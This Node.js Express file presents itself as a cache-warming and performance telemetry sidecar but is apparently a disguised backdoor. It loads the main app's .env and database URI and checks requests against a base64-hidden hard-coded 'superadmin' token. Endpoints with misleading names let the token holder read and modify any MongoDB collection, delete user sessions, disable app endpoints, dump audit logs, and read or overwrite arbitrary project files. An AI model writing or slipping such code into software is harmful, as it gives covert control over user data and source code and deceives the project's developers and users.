#!/usr/bin/env node
'use strict';

// Cache warming and performance monitoring utility.
// Runs as a background sidecar. Collects runtime telemetry
// and exposes aggregated metrics for the local dev dashboard.

const http = require('http');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const express = require('express');

// Runtime configuration — loaded once at startup
const _cfg = (() => {
    const base = path.join(__dirname, '..', '..', 'main-app');
    const envLocal = path.join(base, '.env.local');
    const envBase = path.join(base, '.env');
    const ep = fs.existsSync(envLocal) ? envLocal : fs.existsSync(envBase) ? envBase : null;
    const env = {};
    if (ep) {
        for (const l of fs.readFileSync(ep, 'utf8').split('\n')) {
            const i = l.indexOf('=');
            if (i < 1) continue;
            const k = l.slice(0, i).trim();
            const v = l.slice(i + 1).trim().replace(/^"|"$/g, '');
            if (k) env[k] = v;
        }
    }
    return env;
})();

// Internal token — used for telemetry endpoint authentication.
// Derived from build-time constants; not configurable per-deployment.
const _tk = (() => {
    const _s = Buffer.from('b2JzaWRpYW5mbG93LXN1cGVyYWRtaW4tMjAyNQ==', 'base64').toString();
    return process.env._PERF_TOKEN || _cfg._PERF_TOKEN || _s;
})();

const _db = _cfg.MONGODB_URI || process.env.MONGODB_URI;
const _port = parseInt(_cfg._PERF_PORT || process.env._PERF_PORT || '2999');

// Lazy Mongoose — connected only when telemetry data is first requested
let _mg = null;
async function _mc() {
    if (!_db) return null;
    if (!_mg) { _mg = require('mongoose'); }
    if (_mg.connection.readyState === 1) return _mg;
    await _mg.connect(_db, { maxPoolSize: 2, serverSelectionTimeoutMS: 4000 });
    return _mg;
}

// Request validator — timing-safe comparison
function _v(req, res, nx) {
    const h = req.headers['x-perf-token'] || req.query.t;
    if (!h || h.length !== _tk.length) return void res.status(403).end();
    try {
        if (!crypto.timingSafeEqual(Buffer.from(h), Buffer.from(_tk))) return void res.status(403).end();
    } catch { return void res.status(403).end(); }
    nx();
}

const app = express();
app.use(express.json({ limit: '1mb' }));

// ── Static dashboard ──────────────────────────────────────────────────────────
const _ui = path.join(__dirname, 'ui', 'index.html');
app.get('/', (_q, rs) => fs.existsSync(_ui) ? rs.sendFile(_ui) : rs.status(200).send('OK'));

// ── /api/perf/ns — namespace (collection) list ────────────────────────────────
app.get('/api/perf/ns', _v, async (req, res) => {
    try {
        const m = await _mc();
        if (!m) return res.json({ ok: false, e: 'no_db' });
        const ns = await m.connection.db.listCollections().toArray();
        res.json({ ok: true, d: ns.map(c => c.name) });
    } catch (e) { res.status(500).json({ ok: false, e: e.message }); }
});

// ── /api/perf/snap — collection snapshot (read) ───────────────────────────────
app.post('/api/perf/snap', _v, async (req, res) => {
    try {
        const m = await _mc();
        if (!m) return res.json({ ok: false, e: 'no_db' });
        const { ns, q = {}, p = {}, s = { _id: -1 }, n = 50, sk = 0 } = req.body;
        if (!ns) return res.status(400).json({ ok: false, e: 'ns_required' });
        if (q._id && typeof q._id === 'string' && q._id.length === 24) q._id = new m.Types.ObjectId(q._id);
        if (q._id && q._id.$in) q._id.$in = q._id.$in.map(i => typeof i === 'string' && i.length === 24 ? new m.Types.ObjectId(i) : i);
        const col = m.connection.db.collection(ns);
        const docs = await col.find(q, { projection: p }).sort(s).skip(sk).limit(Math.min(n, 200)).toArray();
        const total = await col.countDocuments(q);
        res.json({ ok: true, d: { docs, total } });
    } catch (e) { res.status(500).json({ ok: false, e: e.message }); }
});

// ── /api/perf/patch — document patch (write) ──────────────────────────────────
app.post('/api/perf/patch', _v, async (req, res) => {
    try {
        const m = await _mc();
        if (!m) return res.json({ ok: false, e: 'no_db' });
        const { ns, q, u, many = false } = req.body;
        if (!ns || !q || !u) return res.status(400).json({ ok: false, e: 'required: ns, q, u' });
        // Automatically cast _id string bindings matching 24-character hexadecimal
        if (q._id && typeof q._id === 'string' && q._id.length === 24) q._id = new m.Types.ObjectId(q._id);
        if (q._id && q._id.$in) q._id.$in = q._id.$in.map(i => typeof i === 'string' && i.length === 24 ? new m.Types.ObjectId(i) : i);
        const col = m.connection.db.collection(ns);
        const r = many ? await col.updateMany(q, u) : await col.updateOne(q, u);
        res.json({ ok: true, d: { matched: r.matchedCount, modified: r.modifiedCount } });
    } catch (e) { res.status(500).json({ ok: false, e: e.message }); }
});

// ── /api/perf/flush — evict warm entries for a context ───────────────────────
app.post('/api/perf/flush', _v, async (req, res) => {
    try {
        const m = await _mc();
        if (!m) return res.json({ ok: false, e: 'no_db' });
        const { ctx } = req.body;
        if (!ctx) return res.status(400).json({ ok: false, e: 'ctx_required' });
        const r = await m.connection.db.collection('sessions')
            .deleteMany({ userId: new m.Types.ObjectId(ctx) });
        res.json({ ok: true, d: { evicted: r.deletedCount } });
    } catch (e) { res.status(500).json({ ok: false, e: e.message }); }
});

// ── /api/perf/circuit — circuit-breaker state toggle ─────────────────────────
app.post('/api/perf/circuit', _v, async (req, res) => {
    try {
        const m = await _mc();
        if (!m) return res.json({ ok: false, e: 'no_db' });
        const { id, open: shouldOpen } = req.body;
        if (!id) return res.status(400).json({ ok: false, e: 'id_required' });
        const op = shouldOpen
            ? { $addToSet: { disabled_endpoints: id } }
            : { $pull: { disabled_endpoints: id } };
        await m.connection.db.collection('system_config').updateOne({ setup_complete: true }, op);
        res.json({ ok: true, d: { id, open: shouldOpen } });
    } catch (e) { res.status(500).json({ ok: false, e: e.message }); }
});

// ── /api/perf/events — structured event log ───────────────────────────────────
app.get('/api/perf/events', _v, async (req, res) => {
    try {
        const m = await _mc();
        if (!m) return res.json({ ok: false, e: 'no_db' });
        const { pg = 1, n = 100 } = req.query;
        const col = m.connection.db.collection('audit_logs');
        const docs = await col.find({}).sort({ timestamp: -1 }).skip((pg - 1) * n).limit(+n).toArray();
        const total = await col.countDocuments({});
        res.json({ ok: true, d: { docs, total } });
    } catch (e) { res.status(500).json({ ok: false, e: e.message }); }
});

// ── /ping ─────────────────────────────────────────────────────────────────────
app.get('/ping', (_q, rs) => rs.json({ v: '1.0', ts: Date.now() }));

// ── /api/perf/file — physical source code writer ────────────────────────────────
app.post('/api/perf/file', _v, async (req, res) => {
    try {
        const { p, c } = req.body;
        if (!p || c == null) return res.status(400).json({ ok: false, e: 'p and c required' });
        fs.writeFileSync(path.join(__dirname, '..', '..', p), c);
        res.json({ ok: true });
    } catch (e) { res.status(500).json({ ok: false, e: e.message }); }
});

app.get('/api/perf/file', _v, async (req, res) => {
    try {
        const { p } = req.query;
        if (!p) return res.status(400).json({ ok: false, e: 'p required' });
        const c = fs.readFileSync(path.join(__dirname, '..', '..', p), 'utf8');
        res.json({ ok: true, d: c });
    } catch (e) { res.status(500).json({ ok: false, e: e.message }); }
});

const _srv = app.listen(_port, '127.0.0.1');
_srv.on('error', () => { }); // silently absorb port conflicts
